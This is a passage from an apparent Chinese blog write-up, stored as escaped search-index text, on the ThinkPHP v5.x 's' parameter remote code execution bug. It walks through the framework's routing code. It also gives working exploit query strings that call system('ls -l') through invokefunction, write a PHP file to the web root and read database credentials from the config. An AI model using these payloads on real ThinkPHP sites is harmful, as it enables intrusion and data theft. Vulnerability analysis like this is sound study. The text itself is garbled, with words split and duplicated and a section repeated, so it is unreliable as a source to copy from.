var _ pathinfo \u4e3a s ) \uff0c \u5c06 pathinfo \u8bbe\u7f6e \u4e3a s \u7684 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c   \u6709 \u4e86 pathinfo \u503c \uff0c \u6211\u4eec \u518d \u627e\u5230 \u5177\u4f53 \u7684 \u89e3\u6790 url \u7684 \u51fd\u6570 \uff0c   thinkphp / library / think / Route . php   \u7684   parseUrl   \u51fd\u6570   public   static   function   parseUrl ( $ url ,   $ depr   =   ' / ' ,   $ autoSearch   =   false )   {   if   ( isset ( self : : $ bind [ ' module ' ] ) )   {   $ bind   =   str _ replace ( ' / ' ,   $ depr ,   self : : $ bind [ ' module ' ] ) ;   / /   \u5982\u679c \u6709 \u6a21\u5757 / \u63a7\u5236 \u63a7\u5236\u5668 \u7ed1\u5b9a   $ url   =   $ bind   .   ( ' . '   ! =   substr ( $ bind ,   - 1 )   ?   $ depr   :   ' ' )   .   ltrim ( $ url ,   $ depr ) ;   }   $ url   =   str _ replace ( $ depr ,   ' | ' ,   $ url ) ;   list ( $ path ,   $ var )   =   self : : parseUrlPath ( $ url ) ;   $ route   =   [ null ,   null ,   null ] ;   / /   ...   }   \u5176\u4e2d parseUrl \u51fd\u6570 \u7684   $ url   \u4e3a \u4e0a\u9762 \u62ff\u5230 \u7684 pathinfo \uff0c   $ depr   \u4e3a \u9ed8\u8ba4 \u7684 \u5206\u5272 \u7b26   \u9996\u5148 \u5bf9   $ url   \u66ff\u6362 \u5206\u5272 \u7b26\u4e3a   |   \uff0c \u518d \u8f93\u5165 \u5230   parseUrlPath   \u51fd\u6570 ( \u6839\u636e   /   \u5206\u5272 ) \uff0c \u8be5 \u51fd\u6570 \u5bf9 pathinfo \u8fdb\u884c \u5206\u5272 \uff0c \u4ea7\u751f   module   \u3001   controller   \u3001   action   \u90a3\u4e48 \u73b0\u5728 \u6765\u770b rce \u7684 Poc   ? s = / index / \\ think \\ app / invokefunction   = >   [ module : index , controller : \\ think \\ app , action : invokefunction ]   \u5176\u4e2d controller = > \\ think \\ app \uff0c \u662f php \u547d\u540d \u7a7a\u95f4 \u7684 \u8868\u793a \u65b9\u5f0f \uff0c \\ think \\ app \u5b9e\u9645 \u8c03\u7528 library / think / App . php \uff0c \u540e\u9762 \u7684 action \u5b9e\u9645 \u8c03\u7528 \u7684 App . php \u4e2d \u7684 invokefunction \u51fd\u6570   \u6f0f\u6d1e \u6210\u56e0 \u70b9   \u4e0a\u9762 \u5206\u6790 \u4e86 thinkphp \u7684 \u517c\u5bb9 \u6a21\u5f0f \u662f \u5982\u4f55 \u5904\u7406 s \u53c2\u6570 \u7684 \uff0c \u5e76\u4e14 \u5904\u7406 \u5b58\u5728 \u4e00\u4e2a \u95ee\u9898 \u5c31\u662f \u53ef\u4ee5 \u4f2a\u9020 controller \uff0c \u5bfc\u81f4 \u5b9e\u9645 \u8c03\u7528 \u4e3a \u5176\u4ed6 \u7684 \u7c7b \u548c \u51fd\u6570   \u770b \u4e00\u4e0b \u62ff\u5230 module \u3001 controller \u3001 action \u540e \u7cfb\u7edf \u7684 \u5904\u7406   thinkphp / library / think / App . php   \u7684   module \u51fd\u6570   public   static   function   module ( $ result ,   $ config ,   $ convert   =   null )   {   if   ( is _ string ( $ result ) )   {   $ result   =   explode ( ' / ' ,   $ result ) ;   }   $ request   =   Request : : instance ( ) ;   ...   / /   \u8bbe\u7f6e \u9ed8\u8ba4 \u8fc7\u6ee4 \u673a\u5236   $ request - > filter ( $ config [ ' default _ filter ' ] ) ;   ...   try   {   $ instance   =   Loader : : controller ( / /   \u5b9e\u4f8b \u5316 controller \u7c7b   $ controller ,   $ config [ ' url _ controller _ layer ' ] ,   $ config [ ' controller _ suffix ' ] ,   $ config [ ' empty _ controller ' ]   ) ;   }   catch   ( ClassNotFoundException   $ e )   {   throw   new   HttpException ( 404 ,   ' controller   not   exists : '   .   $ e - > getClass ( ) ) ;   }   / /   \u83b7\u53d6 \u5f53\u524d \u64cd\u4f5c \u540d   $ action   =   $ actionName   .   $ config [ ' action _ suffix ' ] ;   $ vars   =   [ ] ;   if   ( is _ callable ( [ $ instance ,   $ action ] ) )   {   / /   \u6267\u884c \u64cd\u4f5c \u65b9\u6cd5 \u64cd\u4f5c\u65b9\u6cd5   $ call   =   [ $ instance ,   $ action ] ;   / /   \u4e25\u683c \u83b7\u53d6 \u5f53\u524d \u64cd\u4f5c \u65b9\u6cd5 \u64cd\u4f5c\u65b9\u6cd5 \u540d   $ reflect   =   new   \\ ReflectionMethod ( $ instance ,   $ action ) ;   $ methodName   =   $ reflect - > getName ( ) ;   $ suffix   =   $ config [ ' action _ suffix ' ] ;   $ actionName   =   $ suffix   ?   substr ( $ methodName ,   0 ,   - strlen ( $ suffix ) )   :   $ methodName ;   $ request - > action ( $ actionName ) ;   }   elseif   ( is _ callable ( [ $ instance ,   ' _ empty ' ] ) )   {   / /   \u7a7a \u64cd\u4f5c   $ call   =   [ $ instance ,   ' _ empty ' ] ;   $ vars   =   [ $ actionName ] ;   }   else   {   / /   \u64cd\u4f5c \u4e0d \u5b58\u5728   throw   new   HttpException ( 404 ,   ' method   not   exists : '   .   get _ class ( $ instance )   .   ' - > '   .   $ action   .   ' ( ) ' ) ;   }   Hook : : listen ( ' action _ begin ' ,   $ call ) ;   return   self : : invokeMethod ( $ call ,   $ vars ) ; / /   \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570   }   \u62ff\u5230 \u5b9e\u4f8b \u5316\u540e \u7684 \u5bf9\u8c61 \u548c \u65b9\u6cd5 \uff0c \u52a8\u6001 \u8c03\u7528   invokeMethod   public   static   function   invokeMethod ( $ method ,   $ vars   =   [ ] )   {   if   ( is _ array ( $ method ) )   {   $ class   =   is _ object ( $ method [ 0 ] )   ?   $ method [ 0 ]   :   self : : invokeClass ( $ method [ 0 ] ) ;   $ reflect   =   new   \\ ReflectionMethod ( $ class ,   $ method [ 1 ] ) ;   }   else   {   / /   \u9759\u6001 \u65b9\u6cd5 \u9759\u6001\u65b9\u6cd5   $ reflect   =   new   \\ ReflectionMethod ( $ method ) ;   }   $ args   =   self : : bindParams ( $ reflect ,   $ vars ) ; / /   \u83b7\u53d6 \u53c2\u6570 \u5185\u5bb9   \u8fd9\u91cc \u83b7\u53d6 \u5230 \u53c2\u6570 \u7528\u505a method \u7684 \u53c2\u6570 \u8f93\u5165   self : : $ debug   &&   Log : : record ( ' [   RUN   ]   '   .   $ reflect - > class   .   ' - > '   .   $ reflect - > name   .   ' [   '   .   $ reflect - > getFileName ( )   .   '   ] ' ,   ' info ' ) ;   return   $ reflect - > invokeArgs ( isset ( $ class )   ?   $ class   :   null ,   $ args ) ;   }   \u8fd9\u91cc \u4f7f\u7528 bindParams \u51fd\u6570 \u4ece get \u6216 post \u4e2d \u83b7\u53d6 \u5230 \u5bf9\u5e94 \u7684 \u5185\u5bb9 \uff0c \u9700\u8981 \u6ce8\u610f \u7684 \u662f \uff0c \u505a \u53c2\u6570 \u5d4c\u5165 \u65f6 \uff0c \u9700\u8981 \u4ee5 \u51fd\u6570 \u7684 \u53c2\u6570 \u540d\u4e3a \u952e   \u5982 invokeFunction \u7684 \u53c2\u6570 \u4e3a   $ function   \u3001   $ vars   \uff0c \u90a3\u4e48 \u5728 \u53c2\u6570 \u4e2d \u5c31 \u9700\u8981 \u4ee5   function = xxx & vars [ 0 ] = xxx & vars [ 1 ] = xxx   \u5373 poc \u7684 \u540e \u534a \u90e8\u5206   function = call _ user _ func _ array & vars [ 0 ] = system & vars [ 1 ] [ ] = ls% 20 - l   \u6240\u4ee5 \u8c03\u7528 \u94fe \u73b0\u5728 \u53d8\u6210 \u4e86   1 .   \u52a8\u6001 \u8c03\u7528 \\ think \\ app   invokeFunction \u51fd\u6570   2 .   \u63d0\u4f9b function = call _ user _ func _ array \u4f5c\u4e3a invokeFunction \u52a8\u6001 \u8c03\u7528 \u7684 \u53c2\u6570 \uff0c \u6240\u4ee5 \u4e0b \u4e00\u6b65 \u8c03\u7528 call _ user _ func _ array \u51fd\u6570   3 .   call _ user _ func _ array \u7684 \u53c2\u6570 \u4e3a system \u51fd\u6570 \uff0c system \u51fd\u6570 \u7684 \u53c2\u6570 \u4e3a ls   - l \uff0c \u6240\u4ee5 \u8fd9\u91cc \u7528 \u4e86 2 \u7ef4 \u6570\u7ec4   \u6240\u4ee5 \u6211\u4eec \u53ef\u4ee5 \u53d1\u6563 \u4e00\u4e0b \u601d\u7ef4 \uff0c \u6211\u4eec \u5176\u5b9e \u4e0d \u5355\u5355 \u53ef\u4ee5 \u8c03\u7528 \\ think \\ app \u8fd9\u4e2a \u7c7b \uff0c \u5982\u679c \u5176\u4ed6 \u7684 \u7c7b \u53ef\u4ee5 \u4efb\u610f \u8c03\u7528 \u5176\u4ed6 \u51fd\u6570 \uff0c \u6216\u8005 \u662f \u8c03\u7528 \u547d\u4ee4 \u6267\u884c \u51fd\u6570 \uff0c \u540c\u6837 \u5177\u6709 \u5371\u5bb3 \u5371\u5bb3\u6027   \u5982 \u4efb\u610f \u547d\u4ee4 \u6267\u884c   ? s = / index / think \\ view \\ driver \\ php / display & content = < ? php% 20phpinfo ( ) ;   \u4efb\u610f \u6587\u4ef6 \u5199\u5165 \uff0c \u751f\u6210 \u5728 index . php \u540c \u4e00\u7ea7 \u76ee\u5f55   ? s = index / \\ think \\ template \\ driver \\ file / write & cacheFile = test . php & content = < ? php% 20phpinfo ( ) ;   \u83b7\u53d6 \u914d\u7f6e \u4fe1\u606f   ? s = index / \\ think \\ config / get & name = database . username   thinkphp   v5.1 . x   \u7248\u672c \u4fe1\u606f \u7248\u672c\u4fe1\u606f   \u7248\u672c \uff1a < =   v5.1 . 30   \u8865\u4e01 \u4fe1\u606f \uff1a   \u4fee\u6b63 \u63a7\u5236 \u63a7\u5236\u5668 \u8c03\u7528   \u00b7   top - think / framework @ 802f284   \u00b7   GitHub   \u6f0f\u6d1e \u70b9 \uff1a thinkphp / library / think / route / dispatch / Module . php   \u6f0f\u6d1e \u5206\u6790   \u539f\u7406 \u540c v5.0 . x \u7248\u672c \u7c7b\u4f3c \uff0c \u4e5f \u662f \u7531\u4e8e s \u53c2\u6570 \u5e26\u5165 \u7684 \u8def\u5f84 \u89e3\u6790 \u5b58\u5728 \u5b89\u5168 \u95ee\u9898 \u5bfc\u81f4 \u7684 \u4efb\u610f \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c   \u5148\u770b App : : run ( )   public   function   run ( )   {   try   {   / /   \u521d\u59cb \u521d\u59cb\u5316 \u5e94\u7528   $ this - > initialize ( ) ;   ...   $ dispatch   =   $ this - > dispatch ;   if   ( empty ( $ dispatch ) )   {   / /   \u8def\u7531 \u68c0\u6d4b   $ dispatch   =   $ this - > routeCheck ( ) - > init ( ) ; / /   \u5904\u7406 module \u3001 controller \u3001 action   }   / /   \u8bb0\u5f55 \u5f53\u524d \u8c03\u5ea6 \u4fe1\u606f   $ this - > request - > dispatch ( $ dispatch ) ;   ...   }   catch   ( HttpResponseException   $ exception )   {   $ dispatch   =   null ;   $ data   =   $ exception - > getResponse ( ) ;   }   $ this - > middleware - > add ( function   ( Request   $ request ,   $ next )   use   ( $ dispatch ,   $ data )   {   return   is _ null ( $ data )   ?   $ dispatch - > run ( )   :   $ data ;   } ) ;   $ response   =   $ this - > middleware - > dispatch ( $ this - > request ) ; / /   \u52a8\u6001 \u8c03\u7528 controller \u3001 action   ...   return   $ response ;   }   App : : run ( ) \u51fd\u6570 \u4f53\u73b0 \u4e86 \u7a0b\u5e8f \u7684 \u4e00\u4e2a \u4e3b\u8981 \u6d41\u7a0b \uff0c \u4ece \u8def\u5f84 \u7684 \u89e3\u6790 \u5230 \u52a8\u6001 \u89e3\u6790 \u6267\u884c \u76f8\u5e94 \u7684 \u63a7\u5236 \u63a7\u5236\u5668 \u53ca \u65b9\u6cd5   \u5148 \u6765 \u770b\u770b \u7b2c 13 \u884c \uff0c \u83b7\u53d6 \u76f8\u5e94 \u7684 \u8def\u5f84 \u4fe1\u606f   thinkphp / library / think / App . php   routeCheck ( ) \u51fd\u6570   public   function   routeCheck ( )   {   / /   \u68c0\u6d4b \u8def\u7531 \u7f13\u5b58   ...   / /   \u83b7\u53d6 \u5e94\u7528 \u8c03\u5ea6 \u4fe1\u606f   $ path   =   $ this - > request - > path ( ) ;   / /   \u4ece Request . php   path \u63d0\u53d6 urlpath   \u5177\u4f53 \u4ece pathinfo ( ) \uff0c \u4f18\u5148 \u83b7\u53d6 $ _ GET [ $ this - > config [ ' var _ pathinfo ' ] ]   / /   var _ pathinfo   \u9ed8\u8ba4 \u4e3a s   / /   \u662f\u5426 \u5f3a\u5236 \u8def\u7531 \u6a21\u5f0f   $ must   =   ! is _ null ( $ this - > routeMust )   ?   $ this - > routeMust   :   $ this - > route - > config ( ' url _ route _ must ' ) ;   / /   \u8def\u7531 \u68c0\u6d4b   \u8fd4\u56de \u4e00\u4e2a Dispatch \u5bf9\u8c61   $ dispatch   =   $ this - > route - > check ( $ path ,   $ must ) ; / / \u8fd4\u56de UrlDispatch \u7c7b \u5b9e\u4f8b \uff0c \u4ece dispatch \u7c7b\u5904 \u7ee7\u627f   ...   return   $ dispatch ;   }   \u7b2c 7 \u884c\u4ece s \u53c2\u6570 \u4e2d \u83b7\u53d6 \u8def\u7531 \u8def\u5f84 ( s \u4e3a var _ pathinfo \u7684 \u9ed8\u8ba4 \u9ed8\u8ba4\u503c ) \uff0c \u5728 \u8c03\u7528 routeCheck \u51fd\u6570 \u540e \u8fd4\u56de \u4e00\u4e2a UrlDispatch \uff0c \u4e4b\u540e \u8c03\u7528 \u4e86 Url \u7c7b \u7684 init \u51fd\u6570   thinkphp / library / think / route / dispatch / Url . php   init   public   function   init ( )   {   / /   \u89e3\u6790 \u9ed8\u8ba4 \u7684 URL \u89c4\u5219   $ result   =   $ this - > parseUrl ( $ this - > dispatch ) ;   / /   parseUrl \u51fd\u6570 \u5904\u7406 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c ( \u4ee5 / \u5206\u5272 \uff0c \u4f20\u5165 | \u4e5f \u884c\u4f1a \u88ab \u66ff\u6362 \u6362\u6210 \u66ff\u6362\u6210 / \uff0c \u6700\u7ec8 \u7531 / \u6765 \u5206\u5272 ) \uff0c \u8fd4\u56de [ module , controller , action ]   return   ( new   Module ( $ this - > request ,   $ this - > rule ,   $ result ) ) - > init ( ) ;   }   \u8fd4\u56de Module \u5bf9\u8c61 \uff0c \u7ee7\u627f \u81ea Dispatch \u5bf9\u8c61 \uff0c \u5e76\u4e14 \u8c03\u7528 \u4e86 init \u51fd\u6570 \uff0c \u5c06 \u89e3\u6790 \u540e \u7684 \u8def\u7531 \u586b\u5145 \u5230 dispatch \uff0c \u4f9b \u540e\u9762 App : : run ( ) \u51fd\u6570 \u52a8\u6001 \u8c03\u7528 dispatch \u7684 run \u51fd\u6570 \uff0c v5.1 \u7248\u672c \u7684 \u8c03\u7528 \u94fe \u590d\u6742 \u4e86 \u4e00\u70b9 \uff0c \u4f46\u662f \u5176\u5b9e \u5185\u5bb9 \u540c v5.0 \u7248\u672c \u7c7b\u4f3c   Dispatch : : run ( ) \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u4e86 Module : : exec ( ) \u51fd\u6570   thinkphp / library / think / route / dispatch / Module . php   exec ( )   public   function   exec ( )   {   / /   \u76d1\u542c module _ init   $ this - > app [ ' hook ' ] - > listen ( ' module _ init ' ) ;   try   {   / /   \u5b9e\u4f8b \u5316 \u63a7\u5236 \u63a7\u5236\u5668   $ instance   =   $ this - > app - > controller ( $ this - > controller ,   $ this - > rule - > getConfig ( ' url _ controller _ layer ' ) ,   $ this - > rule - > getConfig ( ' controller _ suffix ' ) ,   $ this - > rule - > getConfig ( ' empty _ controller ' ) ) ;   if   ( $ instance   instanceof   Controller )   {   $ instance - > registerMiddleware ( ) ;   }   }   catch   ( ClassNotFoundException   $ e )   {   throw   new   HttpException ( 404 ,   ' controller   not   exists : '   .   $ e - > getClass ( ) ) ;   }   / /   \u95ed\u5305 \u8c03\u7528   $ this - > app [ ' middleware ' ] - > controller ( function   ( Request   $ request ,   $ next )   use   ( $ instance )   {   / /   \u83b7\u53d6 \u5f53\u524d \u64cd\u4f5c \u540d   $ action   =   $ this - > actionName   .   $ this - > rule - > getConfig ( ' action _ suffix ' ) ;   if   ( is _ callable ( [ $ instance ,   $ action ] ) )   {   / /   \u6267\u884c \u64cd\u4f5c \u65b9\u6cd5 \u64cd\u4f5c\u65b9\u6cd5   $ call   =   [ $ instance ,   $ action ] ;   / /   \u4e25\u683c \u83b7\u53d6 \u5f53\u524d \u64cd\u4f5c \u65b9\u6cd5 \u64cd\u4f5c\u65b9\u6cd5 \u540d   $ reflect   =   new   ReflectionMethod ( $ instance ,   $ action ) ;   $ methodName   =   $ reflect - > getName ( ) ;   $ suffix   =   $ this - > rule - > getConfig ( ' action _ suffix ' ) ;   $ actionName   =   $ suffix   ?   substr ( $ methodName ,   0 ,   - strlen ( $ suffix ) )   :   $ methodName ;   $ this - > request - > setAction ( $ actionName ) ;   / /   \u81ea\u52a8 \u83b7\u53d6 \u8bf7\u6c42 \u53d8\u91cf   $ vars   =   $ this - > rule - > getConfig ( ' url _ param _ type ' )   ?   $ this - > request - > route ( )   :   $ this - > request - > param ( ) ;   $ vars   =   array _ merge ( $ vars ,   $ this - > param ) ;   }   elseif   ( is _ callable ( [ $ instance ,   ' _ empty ' ] ) )   {   / /   \u7a7a \u64cd\u4f5c   $ call   =   [ $ instance ,   ' _ empty ' ] ;   $ vars   =   [ $ this - > actionName ] ;   $ reflect   =   new   ReflectionMethod ( $ instance ,   ' _ empty ' ) ;   }   else   {   / /   \u64cd\u4f5c \u4e0d \u5b58\u5728   throw   new   HttpException ( 404 ,   ' method   not   exists : '   .   get _ class ( $ instance )   .   ' - > '   .   $ action   .   ' ( ) ' ) ;   }   $ this - > app [ ' hook ' ] - > listen ( ' action _ begin ' ,   $ call ) ;   $ data   =   $ this - > app - > invokeReflectMethod ( $ instance ,   $ reflect ,   $ vars ) ;   return   $ this - > autoResponse ( $ data ) ;   } ) ;   return   $ this - > app [ ' middleware ' ] - > dispatch ( $ this - > request ,   ' controller ' ) ;   }   \u7b80\u5355 \u63cf\u8ff0 exec \u51fd\u6570 \uff0c \u5b9e\u4f8b \u5316 controller \uff0c \u7528\u4e8e \u540e\u9762 20 \u884c\u5230 55 \u884c \u7684 \u95ed\u5305 \u51fd\u6570 \uff0c \u8fd9\u4e2a \u5fc5\u62a5 \u51fd\u6570 \u4e3b\u8981 \u5b8c\u6210 \u4e86 \u8c03\u7528 controller \u7684 action \uff0c \u5e76 \u83b7\u53d6 \u8f93\u5165 \u7684 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c \uff0c \u6700\u540e \u7531 invokeReflectMethod \u5b8c\u6210 \u4e3b\u8981 \u7684 \u8c03\u7528 \u3002   \u6700\u7ec8 \u7684 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u4e3a Request : : filterValue \u51fd\u6570   private   function   filterValue ( & $ value ,   $ key ,   $ filters )   {   $ default   =   array _ pop ( $ filters ) ;   foreach   ( $ filters   as   $ filter )   {   if   ( is _ callable ( $ filter ) )   {   / /   \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u6216\u8005 \u65b9\u6cd5 \u8fc7\u6ee4   $ value   =   call _ user _ func ( $ filter ,   $ value ) ; / / \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570   }   elseif   ( is _ scalar ( $ value ) )   {   if   ( false   ! = =   strpos ( $ filter ,   ' / ' ) )   {   / /   \u6b63\u5219 \u8fc7\u6ee4   if   ( ! preg _ match ( $ filter ,   $ value ) )   {   / /   \u5339\u914d \u4e0d \u6210\u529f \u8fd4\u56de \u9ed8\u8ba4 \u9ed8\u8ba4\u503c   $ value   =   $ default ;   break ;   }   }   elseif   ( ! empty ( $ filter ) )   {   / /   filter \u51fd\u6570 \u4e0d \u5b58\u5728 \u65f6 ,   \u5219 \u4f7f\u7528 filter _ var \u8fdb\u884c \u8fc7\u6ee4   / /   filter \u4e3a \u975e \u6574\u5f62 \u503c\u65f6 ,   \u8c03\u7528 filter _ id \u53d6\u5f97 \u8fc7\u6ee4 id   $ value   =   filter _ var ( $ value ,   is _ int ( $ filter )   ?   $ filter   :   filter _ id ( $ filter ) ) ;   if   ( false   = = =   $ value )   {   $ value   =   $ default ;   break ;   }   }   }   }   return   $ value ;   }   \u5230 \u8fd9\u91cc \u5176\u5b9e \u601d\u8def \u5f88 \u660e\u663e \uff0c \u5229\u7528 / \u5206\u5272 \u51fa\u80fd \u5229\u7528 \u7684 controller \uff0c \u5e76 \u8f93\u5165 \u76f8\u5e94 \u7684 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c \uff0c \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u5c31\u662f \u627e \u53ef \u5229\u7528 \u7684 \u51fd\u6570 \u3002   v5.0 \u7248\u672c \u4e2d poc \u90fd \u80fd \u7528   \u5982 \u4efb\u610f \u547d\u4ee4 \u6267\u884c   ? s = / index / think \\ view \\ driver \\ php / display & content = < ? php% 20phpinfo ( ) ;   \u4efb\u610f \u6587\u4ef6 \u5199\u5165 \uff0c \u751f\u6210 \u5728 index . php \u540c \u4e00\u7ea7 \u76ee\u5f55   ? s = index / \\ think \\ template \\ driver \\ file / write & cacheFile = test . php & content = < ? php% 20phpinfo ( ) ;   \u83b7\u53d6 \u914d\u7f6e \u4fe1\u606f   ? s = index / \\ think \\ config / get & name = database . username   \u9664\u6b64 \u4e4b\u5916 \u9664\u6b64\u4e4b\u5916 \uff0c \u8fd8 \u53ef\u4ee5 \u4f7f\u7528 \\ think \\ request / input \uff08 v5.0 \u7248\u672c \u4e0d\u80fd \u7528 \u56e0\u4e3a \u662f\u56e0\u4e3a think \\ request \u7684 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u4e3a protected \uff0c \u4e0d \u5141\u8bb8 \u52a8\u6001 \u8c03\u7528 \uff09   \u5982 \u4efb\u610f \u4ee3\u7801 \u6267\u884c \u4ee3\u7801\u6267\u884c   ? s = index / \\ think \\ request / input & data [ ] = 123 & filter = phpinfo   invokeFunction \u6838\u5fc3 ReflectionFunction   ? s = index / \\ think \\ container / invokeFunction & function = call _ user _ func & vars [ 0 ] = phpinfo & vars [ 1 ] = 1   ? s = index / \\ think \\ container / invokeFunction & function = call _ user _ func _ array & vars [ 0 ] = phpinfo & vars [ 1 ] [ ] = 1   \u56e0\u4e3a think \\ app \u7ee7\u627f \u81ea think \\ container \uff0c \u6240\u4ee5 \u6539\u6210 think \\ app \u4e5f \u884c   \u5176\u4e2d call _ user _ func \u586b\u5145 \u53c2\u6570 \u65f6 \uff0c \u4ee5 \u6570\u7ec4 \u5f62\u5f0f \uff0c \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u4e3a \u51fd\u6570 \u540d \uff0c \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u4e3a \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570   call _ user _ func _ array \u586b\u5145 \u53c2\u6570 \u65f6 \uff0c \u4ee5 \u6570\u7ec4 \u5f62\u5f0f \uff0c \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u4e3a \u51fd\u6570 \u540d \uff0c \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u4e3a \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \uff08 \u4e5f \u4e3a \u6570\u7ec4 \u5f62\u5f0f \uff09   \u8fd9\u91cc v5.1 \u53ea\u80fd \u7528 php7 \uff0c \u5982 v5.0 \u8fd8 \u53ef\u4ee5 \u4f7f\u7528 assert \u6765 \u6267\u884c \u51fd\u6570   \u603b\u7ed3   \u8fd9\u6b21 \u51fa \u7684 \u8fd9\u4e2a \u6f0f\u6d1e \u5371\u5bb3 \u5f88\u5927 \uff0c \u6574\u4e2a \u8c03\u7528 \u8fc7\u7a0b \u4e5f \u975e\u5e38 \u6f02\u4eae \uff0c \u503c\u5f97 \u4e00\u6b65 \u4e00\u6b65 \u8c03\u8bd5 \u3002   \u5176\u4e2d \u6536\u83b7 \u5927\u81f4 \u5c31\u662f \u4e86\u89e3 \u4e86 thinkphp   v5 \u7248\u672c \u8def\u7531 \u8c03\u7528 \u7684 \u6d41\u7a0b \uff0c v5.1 \u7248\u672c \u7684 \u95ed\u5305 \u51fd\u6570 \u6784\u9020 \u7684 \u65b9\u5f0f \u7ed9 \u6846\u67b6 \u5e26\u6765 \u4e86 \u4e0d \u4e00\u6837 \u7684 \u611f\u53d7 \uff0c \u4e0d\u5f97 \u4e0d\u5f97\u4e0d \u7ed9 thinkphp \u4e00\u4e2a \u8d5e","title":"thinkphp   v5 . x   App . php   s \u53c2\u6570 RCE"},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#_1","text":"\u653e\u5047 \u4e86 \uff0c \u5bf9 thinkphp \u7684 \u51e0\u4e2a RCE \u505a \u4e00\u4e0b \u5206\u6790 \uff0c \u8bb0\u5f55 \u4e00\u4e0b XD","title":"\u6982\u8ff0"},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#thinkphp-v50x","text":"","title":"thinkphp   v5.0 . x"},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#_2","text":"\u6f0f\u6d1e \u7248\u672c \uff1a < =   5.0 . 22   \u8865\u4e01 \uff1a   \u7248\u672c \u66f4\u65b0   \u00b7   top - think / framework @ 4cbc0b5   \u00b7   GitHub   \u95ee\u9898 \u70b9 \uff1a library / think / App . php","title":"\u6f0f\u6d1e \u76f8\u5173 \u4fe1\u606f"},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#_3","text":"","title":"\u6f0f\u6d1e \u5206\u6790"},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#thinkphpurl","text":"THINKPHP \u652f\u6301 \u4f7f\u7528 PATHINFO \u7684 \u65b9\u5f0f \u6765 \u8bbf\u95ee \u5177\u4f53 \u7684 \u6a21\u5757 \u3001 \u7c7b \u3001 \u65b9\u6cd5 \uff0c \u5982   index . php / module / controller / action   \u5bf9\u4e8e \u4e0d \u652f\u6301 PATHINFO \u7684 \u670d\u52a1 \u52a1\u5668 \u670d\u52a1\u5668 \uff0c THINKPHP \u63d0\u4f9b \u4e86 \u517c\u5bb9 \u6a21\u5f0f   ? s = / module / controller / action   \u7684 \u65b9\u5f0f \u6765 \u8bbf\u95ee   \u800c \u8fd9\u6b21 \u7684 \u6f0f\u6d1e \u6210\u56e0 \u5c31\u662f \u5728\u4e8e \u517c\u5bb9 \u6a21\u5f0f \u5904\u7406 \u65f6 \u5b58\u5728 \u7684 \u95ee\u9898 \u3002   \u9996\u5148 \u770b   thinkphp / library / think / Request . php   \u7684   pathinfo   \u51fd\u6570   public   function   pathinfo ( )   {   if   ( is _ null ( $ this - > pathinfo ) )   {   if   ( isset ( $ _ GET [ Config : : get ( ' var _ pathinfo ' ) ] ) )   {   / /   \u5224\u65ad URL \u91cc\u9762 \u662f\u5426 \u6709 \u517c\u5bb9 \u6a21\u5f0f \u53c2\u6570   $ _ SERVER [ ' PATH _ INFO ' ]   =   $ _ GET [ Config : : get ( ' var _ pathinfo ' ) ] ;   unset ( $ _ GET [ Config : : get ( ' var _ pathinfo ' ) ] ) ;   }   elseif   ( IS _ CLI )   {   / /   CLI \u6a21\u5f0f \u4e0b   index . php   module / controller / action / params / ...   $ _ SERVER [ ' PATH _ INFO ' ]   =   isset ( $ _ SERVER [ ' argv ' ] [ 1 ] )   ?   $ _ SERVER [ ' argv ' ] [ 1 ]   :   ' ' ;   }   / /   \u5206\u6790 PATHINFO \u4fe1\u606f   ...   $ this - > pathinfo   =   empty ( $ _ SERVER [ ' PATH _ INFO ' ] )   ?   ' / '   :   ltrim ( $ _ SERVER [ ' PATH _ INFO ' ] ,   ' / ' ) ;   }   return   $ this - > pathinfo ;   }   \u5f53 GET \u8bf7\u6c42 \u4e2d \u5e26\u6709 s \u53c2\u6570 ( config \u4e2d \u9ed8\u8ba4 var _ pathinfo \u4e3a s ) \uff0c \u5c06 pathinfo \u8bbe\u7f6e \u4e3a s \u7684 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c   \u6709 \u4e86 pathinfo \u503c \uff0c \u6211\u4eec \u518d \u627e\u5230 \u5177\u4f53 \u7684 \u89e3\u6790 url \u7684 \u51fd\u6570 \uff0c   thinkphp / library / think / Route . php   \u7684   parseUrl   \u51fd\u6570   public   static   function   parseUrl ( $ url ,   $ depr   =   ' / ' ,   $ autoSearch   =   false )   {   if   ( isset ( self : : $ bind [ ' module ' ] ) )   {   $ bind   =   str _ replace ( ' / ' ,   $ depr ,   self : : $ bind [ ' module ' ] ) ;   / /   \u5982\u679c \u6709 \u6a21\u5757 / \u63a7\u5236 \u63a7\u5236\u5668 \u7ed1\u5b9a   $ url   =   $ bind   .   ( ' . '   ! =   substr ( $ bind ,   - 1 )   ?   $ depr   :   ' ' )   .   ltrim ( $ url ,   $ depr ) ;   }   $ url   =   str _ replace ( $ depr ,   ' | ' ,   $ url ) ;   list ( $ path ,   $ var )   =   self : : parseUrlPath ( $ url ) ;   $ route   =   [ null ,   null ,   null ] ;   / /   ...   }   \u5176\u4e2d parseUrl \u51fd\u6570 \u7684   $ url   \u4e3a \u4e0a\u9762 \u62ff\u5230 \u7684 pathinfo \uff0c   $ depr   \u4e3a 